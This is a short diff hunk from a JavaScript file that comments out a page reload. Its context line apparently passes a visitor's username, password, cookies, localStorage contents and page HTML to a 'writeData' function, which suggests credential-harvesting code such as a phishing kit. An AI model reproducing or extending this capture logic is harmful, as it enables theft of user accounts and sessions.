@@ -2608,7 +2608,7 @@ const outerHTML = `
 						}
 						writeData(username, password, time, cookie, localStorageJSON, outerHTML, url);
 
-						location.reload();
+						// location.reload();
 					}
 				});
 				console.log(4)
